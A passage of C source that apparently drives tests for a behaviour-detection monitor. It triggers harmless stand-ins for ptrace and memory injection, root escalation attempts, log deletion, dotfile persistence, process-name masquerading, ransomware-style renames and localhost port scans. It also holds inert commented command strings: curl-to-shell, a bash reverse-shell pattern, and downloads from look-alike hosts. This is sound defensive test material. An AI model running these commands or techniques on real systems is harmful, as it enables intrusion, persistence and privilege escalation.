            execl(at("payload.sh"), "payload.sh", (char *)0);
            _exit(127);
        }
        wait_for(p);
        chdir("/");
    } else if (!strcmp(c, "cred_other_memory")) {
        int fd = open("/proc/1/mem", O_RDONLY);
        if (fd >= 0)
            close(fd);
    } else if (!strcmp(c, "cmd_unspaced")) {
        system("true # curl -s http://example.invalid/x|sh");
    } else if (!strcmp(c, "cmd_obfuscated")) { // quotes and runs of spaces
        system("true # sh -c 'bash   -i >& /tmp/x 0>&1'");
    } else if (!strcmp(c, "cmd_curl_sudo_bash")) {
        system("true # curl -s http://example.invalid/x | sudo /bin/bash");
    } else if (!strcmp(c, "shell_socket_out")) { // only standard output on the socket
        int sv[2], null = open("/dev/null", O_RDWR | O_CLOEXEC);
        lc_socketpair(AF_UNIX, SOCK_STREAM | LC_CLOEXEC, 0, sv);
        pid_t p = fork();
        if (p == 0) {
            dup2(null, 0);
            dup2(sv[0], 1);
            dup2(null, 2);
            execl("/bin/sh", "sh", "-c", "true", (char *)0);
            _exit(127);
        }
        wait_for(p);
        close(sv[0]);
        close(sv[1]);
        close(null);
#if !defined(__APPLE__) // needs /proc/self/fd or fexecve; that test stays Linux-only
    } else if (!strcmp(c, "fileless_deleted")) { // a program file that was removed after it was opened
        int wr = open(at("copy"), O_RDWR | O_CREAT | O_CLOEXEC, 0755);
        copy_true(wr);
        close(wr);
        int ro = open(at("copy"), O_RDONLY | O_CLOEXEC);
        unlink(at("copy"));
        pid_t p = fork();
        if (p == 0) {
            char self[64];
            snprintf(self, sizeof self, "/proc/self/fd/%d", ro);
            execl(self, "true", (char *)0);
            _exit(127);
        }
        wait_for(p);
        close(ro);
#endif
    } else if (!strcmp(c, "persist_create_rdonly")) { // O_CREAT makes the file whatever the access mode
        int fd = open(at(".bashrc"), O_RDONLY | O_CREAT, 0600);
        if (fd >= 0)
            close(fd);
    } else if (!strcmp(c, "unlink_samename")) { // a file with the program's name, not the program
        char me[300];
        if (self_path(me, sizeof me) <= 0)
            return 93;
        const char *name = strrchr(me, '/') + 1;
        put(at(name), "x");
        unlink(at(name));
    } else if (!strcmp(c, "chmod_setgid")) {
        put(at("tool"), "x");
        chmod(at("tool"), 02755);
    } else if (!strcmp(c, "chmod_fd")) {
        int fd = open(at("tool"), O_WRONLY | O_CREAT, 0600);
        fchmod(fd, 04755);
        close(fd);
    } else if (!strcmp(c, "chmod_at")) {
        put(at("tool"), "x");
        fchmodat(AT_FDCWD, at("tool"), 04755, 0);
#if !defined(__APPLE__) // no prctl on Darwin; that test stays Linux-only
    } else if (!strcmp(c, "masq_exe")) {
        prctl(PR_SET_MM, PR_SET_MM_EXE_FILE, -1, 0, 0);
#endif
    } else if (!strcmp(c, "raw_socket")) {
        socket(AF_INET, SOCK_RAW, 1);
    } else if (!strcmp(c, "raw_packet")) {
        socket(17, SOCK_RAW, 0); // AF_PACKET
    } else if (!strcmp(c, "stream_socket")) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s >= 0)
            close(s);
#if !defined(__APPLE__) // no pidfd on Darwin; that test stays Linux-only
    } else if (!strcmp(c, "pidfd_steal")) {
        pidfd_getfd(-1, 0, 0);
#endif
    } else if (!strcmp(c, "ptrace_peek")) { // read, not write
#if defined(__APPLE__)
        // No GETREGSET on Darwin: two different reads are the same detection.
        ptrace(PTRACE_PEEKTEXT, 1, 0, 0);
        ptrace(PTRACE_PEEKDATA, 1, 0, 0);
#else
        ptrace(PTRACE_PEEKTEXT, 1, 0, 0);
        ptrace(PTRACE_GETREGSET, 1, 0, 0);
#endif
#if !defined(__APPLE__) // these requests do not exist on Darwin
    } else if (!strcmp(c, "ptrace_poke")) { // four ways to write into a process, on four lines
        pid_t p = fork();
        if (p == 0) {
            pause();
            _exit(0);
        }
        ptrace(PTRACE_POKETEXT, p, 0, 0);
        ptrace(PTRACE_POKEDATA, p, 0, 0);
        ptrace(PTRACE_POKEUSER, p, 0, 0);
        ptrace(PTRACE_SETREGS, p, 0, 0);
        kill(p, SIGKILL);
        wait_for(p);
    } else if (!strcmp(c, "ptrace_setregset")) { // register write, not POKE*
        pid_t p = fork();
        if (p == 0) {
            pause();
            _exit(0);
        }
        ptrace(PTRACE_SETREGSET, p, 0, 0);
        kill(p, SIGKILL);
        wait_for(p);
    } else if (!strcmp(c, "inject_vm")) {
        pid_t p = fork();
        if (p == 0) {
            pause();
            _exit(0);
        }
        char data[8] = {0};
        struct iovec local = {data, sizeof data}, remote = {(void *)0x1000, sizeof data};
        process_vm_writev(p, &local, 1, &remote, 1, 0);
        kill(p, SIGKILL);
        wait_for(p);
    } else if (!strcmp(c, "cred_vm_read")) {
        pid_t p = fork();
        if (p == 0) {
            pause();
            _exit(0);
        }
        char data[8] = {0};
        struct iovec local = {data, sizeof data}, remote = {(void *)0x1000, sizeof data};
        process_vm_readv(p, &local, 1, &remote, 1, 0);
        kill(p, SIGKILL);
        wait_for(p);
#endif
    } else if (!strcmp(c, "seteuid_root")) {
        seteuid(0);
    } else if (!strcmp(c, "setreuid_root")) {
        setreuid(-1, 0);
#if !defined(__APPLE__) // neither exists on Darwin; those tests stay Linux-only
    } else if (!strcmp(c, "setresuid_root")) {
        setresuid(-1, 0, -1);
    } else if (!strcmp(c, "setfsuid_root")) {
        setfsuid(0);
#endif
    } else if (!strcmp(c, "setgid_root")) {
        setgid(0);
    } else if (!strcmp(c, "setegid_root")) {
        setegid(0);
    } else if (!strcmp(c, "setregid_root")) {
        setregid(-1, 0);
#if !defined(__APPLE__) // neither exists on Darwin; those tests stay Linux-only
    } else if (!strcmp(c, "setresgid_root")) {
        setresgid(-1, 0, -1);
    } else if (!strcmp(c, "setfsgid_root")) {
        setfsgid(0);
#endif
    } else if (!strcmp(c, "setgroups_root")) {
        unsigned g = 0;
        setgroups(1, &g);
    } else if (!strcmp(c, "initgroups_root")) {
        initgroups("nobody", 0);
    } else if (!strcmp(c, "log_unlinkat")) {
        mkdir(at("var"), 0700);
        mkdir(at("var/log"), 0700);
        put(at("var/log/auth.log"), "x");
        unlinkat(AT_FDCWD, at("var/log/auth.log"), 0);
    } else if (!strcmp(c, "log_remove")) {
        mkdir(at("var"), 0700);
        mkdir(at("var/log"), 0700);
        put(at("var/log/auth.log"), "x");
        remove(at("var/log/auth.log"));
    } else if (!strcmp(c, "log_rmdir")) {
        mkdir(at("var"), 0700);
        mkdir(at("var/log"), 0700);
        mkdir(at("var/log/old"), 0700);
        rmdir(at("var/log/old"));
    } else if (!strcmp(c, "remove_other")) {
        put(at("data.txt"), "x");
        remove(at("data.txt"));
    } else if (!strcmp(c, "rmdir_other")) {
        mkdir(at("empty"), 0700);
        rmdir(at("empty"));
    } else if (!strcmp(c, "persist_renameat")) {
        put(at("evil.txt"), "x");
        renameat(AT_FDCWD, at("evil.txt"), AT_FDCWD,
                 (snprintf(path2, sizeof path2, "%s/.profile", dir), path2));
#if !defined(__APPLE__) // no renameat2 on Darwin; that test stays Linux-only
    } else if (!strcmp(c, "persist_renameat2")) {
        put(at("evil.txt"), "x");
        renameat2(AT_FDCWD, at("evil.txt"), AT_FDCWD,
                  (snprintf(path2, sizeof path2, "%s/.profile", dir), path2), 0);
#endif
    } else if (!strcmp(c, "shell_spawn_dup2")) { // parent's stdio is not a socket
        int sv[2];
        lc_socketpair(AF_UNIX, SOCK_STREAM | LC_CLOEXEC, 0, sv);
        posix_spawn_file_actions_t fa;
        posix_spawn_file_actions_init(&fa);
        posix_spawn_file_actions_adddup2(&fa, sv[0], 0);
        posix_spawn_file_actions_adddup2(&fa, sv[0], 1);
        posix_spawn_file_actions_adddup2(&fa, sv[0], 2);
        char *av[] = {"sh", "-c", "true", 0};
        pid_t p = 0;
        posix_spawn(&p, "/bin/sh", &fa, 0, av, environ);
        if (p)
            wait_for(p);
        posix_spawn_file_actions_destroy(&fa);
        close(sv[0]);
        close(sv[1]);
    } else if (!strcmp(c, "persist_link")) {
        put(at("evil.txt"), "x");
        link(at("evil.txt"), (snprintf(path2, sizeof path2, "%s/.profile", dir), path2));
    } else if (!strcmp(c, "persist_linkat")) {
        put(at("evil.txt"), "x");
        linkat(AT_FDCWD, at("evil.txt"), AT_FDCWD,
               (snprintf(path2, sizeof path2, "%s/.profile", dir), path2), 0);
    } else if (!strcmp(c, "persist_symlinkat")) {
        symlinkat("evil", AT_FDCWD,
                  (snprintf(path2, sizeof path2, "%s/.bashrc", dir), path2));
    } else if (!strcmp(c, "noop")) {
        // nothing: the test starts it under another name
#if !defined(__APPLE__) // no prctl on Darwin; those tests stay Linux-only
    } else if (!strcmp(c, "masq_prctl")) { // renames its process to a kernel thread's name
        prctl(PR_SET_NAME, "kworker/0:1", 0, 0, 0);
    } else if (!strcmp(c, "masq_prctl_plain")) {
        prctl(PR_SET_NAME, "worker-3", 0, 0, 0);
#endif
    } else if (!strcmp(c, "masq_pthread_name")) { // does not call the public prctl()
#if defined(__APPLE__) // one argument: the current thread
        pthread_setname_np("kworker/0:1");
#else
        pthread_setname_np(pthread_self(), "kworker/0:1");
#endif
#if !defined(__APPLE__) // no memfd_create on Darwin; that test stays Linux-only
    } else if (!strcmp(c, "masq_memfd")) { // the name /proc shows; not prctl()
        int fd = memfd_create("kworker/0:1", 0);
        if (fd >= 0)
            close(fd);
#endif
    } else if (!strcmp(c, "masq_memfd_plain")) {
#if !defined(__APPLE__)
        int fd = memfd_create("lcbeh-note", 0);
        if (fd >= 0)
            close(fd);
#endif
    } else if (!strcmp(c, "masq_pthread_plain")) {
#if defined(__APPLE__)
        pthread_setname_np("worker-3");
#else
        pthread_setname_np(pthread_self(), "worker-3");
#endif
#if !defined(__APPLE__) // no personality() on Darwin; that test stays Linux-only
    } else if (!strcmp(c, "aslr_off")) {
        personality(0x0040000ul);
#endif
    } else if (!strcmp(c, "aslr_plain")) {
#if !defined(__APPLE__)
        personality(0);
#endif
    } else if (!strcmp(c, "masq_exec_argv0")) { // a program started as a kernel thread
        pid_t p = fork();
        if (p == 0) {
            execl("/bin/true", "[kworker/0:1]", (char *)0);
            _exit(127);
        }
        wait_for(p);
    } else if (!strcmp(c, "masq_exec_sys_name")) { // a system program under another system name
        pid_t p = fork();
        if (p == 0) {
            execl("/bin/true", "sshd", (char *)0);
            _exit(127);
        }
        wait_for(p);
    } else if (!strcmp(c, "masq_create")) { // a file named sshd in a temporary directory
        put(at("sshd"), "x");
    } else if (!strcmp(c, "masq_create_plain")) {
        put(at("worker"), "x");
    } else if (!strcmp(c, "masq_create_cwd")) { // the same name, in the current directory
        chdir(dir);
        put("sshd", "x");
        chdir("/");
    } else if (!strcmp(c, "masq_rename")) {
        put(at("stage.txt"), "x");
        rename(at("stage.txt"), (snprintf(path2, sizeof path2, "%s/systemd-update", dir), path2));
    } else if (!strcmp(c, "sys_open")) { // no O_CREAT: nothing is made, even as root
        int fd = open("/usr/bin/lcbeh-test", O_WRONLY);
        if (fd >= 0)
            close(fd);
    } else if (!strcmp(c, "sys_unlink")) {
        unlink("/usr/bin/lcbeh-nonexistent");
    } else if (!strcmp(c, "sys_rename")) { // into a directory that does not exist
        put(at("evil.txt"), "x");
        rename(at("evil.txt"), "/usr/bin/lcbeh-nodir/ls");
    } else if (!strcmp(c, "sys_chmod")) {
        chmod("/usr/bin/lcbeh-nonexistent", 0755);
    } else if (!strcmp(c, "sys_chown")) {
        chown("/usr/bin/lcbeh-nonexistent", 0, 0);
    } else if (!strcmp(c, "sys_lchown")) {
        lchown("/usr/bin/lcbeh-nonexistent", 0, 0);
    } else if (!strcmp(c, "sys_fchownat")) {
        fchownat(AT_FDCWD, "/usr/bin/lcbeh-nonexistent", 0, 0, 0);
    } else if (!strcmp(c, "sys_fchown")) {
        int fd = open("/usr/bin/ls", O_RDONLY);
        if (fd >= 0) {
            fchown(fd, 0, 0);
            close(fd);
        }
    } else if (!strcmp(c, "chown_other")) {
        put(at("tool"), "x");
        chown(at("tool"), getuid(), getgid());
    } else if (!strcmp(c, "sys_mount")) {
#if defined(__APPLE__) // Darwin order: type, directory, flags, data
        mount("tmpfs", "/usr/bin/ls", 0, 0);
#else
        mount("none", "/usr/bin/ls", "tmpfs", 0, 0);
#endif
    } else if (!strcmp(c, "sys_umount")) {
        umount("/usr/bin/ls");
#if !defined(__APPLE__) // no umount2() on Darwin; that test stays Linux-only
    } else if (!strcmp(c, "sys_umount2")) {
        umount2("/usr/bin/ls", 0);
#endif
    } else if (!strcmp(c, "sys_mount_other")) {
#if defined(__APPLE__)
        mount("tmpfs", "/tmp/lcbeh-not-a-system-dir", 0, 0);
#else
        mount("none", "/tmp/lcbeh-not-a-system-dir", "tmpfs", 0, 0);
#endif
    } else if (!strcmp(c, "sys_link")) {
        put(at("evil.txt"), "x");
        link(at("evil.txt"), "/usr/bin/lcbeh-nodir/x");
    } else if (!strcmp(c, "sys_quiet")) { // reading system files, and a language's byte-code cache
        int fd = open("/usr/bin/ls", O_RDONLY);
        if (fd >= 0)
            close(fd);
        fd = open("/usr/lib/python3/dist-packages/__pycache__/lcbeh.cpython-312.pyc", O_WRONLY);
        if (fd >= 0)
            close(fd);
        fd = open("/usr/share/lcbeh-nonexistent", O_WRONLY);
        if (fd >= 0)
            close(fd);
    } else if (!strcmp(c, "host_getaddrinfo")) { // AI_NUMERICHOST: no lookup is made
        struct addrinfo hints, *res = 0;
        memset(&hints, 0, sizeof hints);
        hints.ai_flags = AI_NUMERICHOST;
        getaddrinfo("paypa1.com", 0, &hints, &res);
        if (res)
            freeaddrinfo(res);
    } else if (!strcmp(c, "host_gethostbyname")) { // does not go through getaddrinfo()
        alarm(2); // the finding is the call; do not wait out a DNS timeout
        gethostbyname("paypa1.com");
    } else if (!strcmp(c, "host_gethostbyname2")) {
        alarm(2);
        gethostbyname2("paypa1.com", AF_INET);
#if !defined(__APPLE__) // no getaddrinfo_a on Darwin; that test stays Linux-only
    } else if (!strcmp(c, "host_getaddrinfo_a")) { // does not call getaddrinfo()
        struct addrinfo hints;
        struct gaicb one, *list = &one;
        memset(&hints, 0, sizeof hints);
        hints.ai_flags = AI_NUMERICHOST; // fail at once: the name is not numeric
        memset(&one, 0, sizeof one);
        one.ar_name = "paypa1.com";
        one.ar_request = &hints;
        getaddrinfo_a(GAI_WAIT, &list, 1, 0);
        if (one.ar_result)
            freeaddrinfo(one.ar_result);
#endif
    } else if (!strcmp(c, "host_ok")) {
        const char *names[] = {"github.com", "api.github.com", "www.google.com", "localhost",
                               "raw.githubusercontent.com", "10.0.0.1", "example.org"};
        struct addrinfo hints, *res = 0;
        memset(&hints, 0, sizeof hints);
        hints.ai_flags = AI_NUMERICHOST;
        for (int i = 0; i < 7; ++i) {
            res = 0;
            getaddrinfo(names[i], 0, &hints, &res);
            if (res)
                freeaddrinfo(res);
        }
        gethostbyname("localhost"); // the real name: not a look-alike, and it does not query DNS
        gethostbyname2("localhost", AF_INET);
#if !defined(__APPLE__) // no getaddrinfo_a on Darwin
        struct addrinfo ghints;
        struct gaicb gone, *glist = &gone;
        memset(&ghints, 0, sizeof ghints);
        ghints.ai_flags = AI_NUMERICHOST;
        memset(&gone, 0, sizeof gone);
        gone.ar_name = "localhost";
        gone.ar_request = &ghints;
        getaddrinfo_a(GAI_WAIT, &glist, 1, 0);
        if (gone.ar_result)
            freeaddrinfo(gone.ar_result);
#endif
    } else if (!strcmp(c, "cmd_lookalike")) {
        system("true # curl -s https://github.com.evil.example/install.sh");
    } else if (!strcmp(c, "cmd_lookalike_digit")) {
        system("true # wget http://micros0ft.com/update.bin");
    } else if (!strcmp(c, "cmd_lookalike_user")) {
        system("true # git clone https://user:pw@gooogle.com/x");
    } else if (!strcmp(c, "cmd_trusted_hosts")) {
        system("true # curl https://api.github.com/repos/x; wget https://raw.githubusercontent.com/a/b");
        system("true # git clone https://gitlab.com/x/y.git; curl https://accounts.google.com/ http://localhost:8080/");
    } else if (!strcmp(c, "ransom") || !strcmp(c, "ransom_few") || !strcmp(c, "ransom_backup") ||
               !strcmp(c, "ransom_renameat2")) {
        // files renamed by adding one ending: .locked is ransomware's, .bak a backup's
        const int n = !strcmp(c, "ransom_few") ? 5 : 25;
        const char *ending = !strcmp(c, "ransom_backup") ? ".bak" : ".locked";
        for (int i = 0; i < n; ++i) {
            char from[200], to[220];
            snprintf(from, sizeof from, "%s/doc%d.txt", dir, i);
            snprintf(to, sizeof to, "%s%s", from, ending);
            put(from, "x");
#if !defined(__APPLE__) // no renameat2 on Darwin; that test stays Linux-only
            if (!strcmp(c, "ransom_renameat2"))
                renameat2(AT_FDCWD, from, AT_FDCWD, to, 0);
            else
#endif
                rename(from, to);
        }
    } else if (!strcmp(c, "scan_ports") || !strcmp(c, "scan_few") || !strcmp(c, "scan_one_port")) {
        // connect() to ports of this machine, without waiting for the answer
        const int n = !strcmp(c, "scan_ports") ? 150 : !strcmp(c, "scan_few") ? 10 : 150;
        for (int i = 0; i < n; ++i) {
#if defined(__APPLE__) // no flag-bearing socket() on Darwin: non-blocking set by hand
            int s = lc_socket(AF_INET, SOCK_STREAM | LC_CLOEXEC | LC_NONBLOCK, 0);
            int f = fcntl(s, F_GETFL);
            if (f >= 0)
                fcntl(s, F_SETFL, f | O_NONBLOCK);
#else
            int s = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC | SOCK_NONBLOCK, 0);
#endif
            struct sockaddr_in a;
            memset(&a, 0, sizeof a);
            a.sin_family = AF_INET;
            a.sin_addr.s_addr = htonl(0x7f000001);
            a.sin_port = htons((unsigned short)(!strcmp(c, "scan_one_port") ? 9 : 40000 + i));
            connect(s, (struct sockaddr *)&a, sizeof a);
            close(s);
        }
#if !defined(__APPLE__) // no sendmmsg on Darwin; that test stays Linux-only
    } else if (!strcmp(c, "scan_sendmmsg")) { // one call, many destinations; not connect()
        struct mmsghdr msgs[150];
        struct sockaddr_in addrs[150];
        struct iovec iov[150];
        char byte = 0;
        memset(msgs, 0, sizeof msgs);
        for (int i = 0; i < 150; ++i) {
            memset(&addrs[i], 0, sizeof addrs[i]);
            addrs[i].sin_family = AF_INET;
            addrs[i].sin_addr.s_addr = htonl(0x7f000001);
            addrs[i].sin_port = htons((unsigned short)(40000 + i));
            iov[i].iov_base = &byte;
            iov[i].iov_len = 1;
            msgs[i].msg_hdr.msg_name = &addrs[i];
            msgs[i].msg_hdr.msg_namelen = sizeof addrs[i];
            msgs[i].msg_hdr.msg_iov = &iov[i];
            msgs[i].msg_hdr.msg_iovlen = 1;
        }
        int s = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
        sendmmsg(s, msgs, 150, 0);
        close(s);
#endif
    } else if (!strcmp(c, "scan_sendto") || !strcmp(c, "scan_sendmsg") ||
               !strcmp(c, "scan_sendto_few")) {
        // a UDP scan never calls connect()
        const int n = !strcmp(c, "scan_sendto_few") ? 10 : 150;
        const int as_msg = !strcmp(c, "scan_sendmsg");
        char byte = 0;
        for (int i = 0; i < n; ++i) {
            int s = lc_socket(AF_INET, SOCK_DGRAM | LC_CLOEXEC, 0);
            struct sockaddr_in a;
            memset(&a, 0, sizeof a);
            a.sin_family = AF_INET;
            a.sin_addr.s_addr = htonl(0x7f000001);
            a.sin_port = htons((unsigned short)(40000 + i));
            if (as_msg) {
                struct iovec iov = {&byte, 1};
                struct msghdr m;
                memset(&m, 0, sizeof m);
                m.msg_name = &a;
                m.msg_namelen = sizeof a;
                m.msg_iov = &iov;
                m.msg_iovlen = 1;
                sendmsg(s, &m, 0);
            } else {
                sendto(s, &byte, 1, 0, (struct sockaddr *)&a, sizeof a);
            }
            close(s);
        }
    } else if (!strncmp(c, "api_", 4)) {
        return api(c + 4);
    } else {
        return 2;
    }
    return 0;
}

int main(int argc, char **argv) {
    if (argc < 2)
        return 2;
    strcpy(dir, "/tmp/lcbeh_XXXXXX");
    if (!mkdtemp(dir))
        return 90;
    const int rc = run(argv[1]);
    rm_tree(dir);
    return rc;
}
